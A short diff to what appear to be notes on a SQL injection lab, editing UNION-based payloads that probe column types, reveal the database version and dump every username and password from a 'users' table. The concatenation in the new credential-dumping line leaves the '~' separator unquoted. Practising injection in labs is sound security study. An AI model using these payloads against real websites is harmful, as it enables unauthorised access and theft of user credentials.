@@ -195,10 +195,10 @@ GIVEN : The database contains a different table called users, with columns calle
       'UNION SELECT NULL,'abc' --+
 
       -FIND THE DB VENDOR 
-       'UNION SELECT 
+       'UNION SELECT NULL,version() --+
 
-      -FIND THE PASSWORD 
-      'UNION SELECT 'ABC',password from users where sername='administrator' --+
+      -FIND THE USER&PASSWORD 
+      'UNION SELECT NULL,username||~||password from users --+
 
 
 
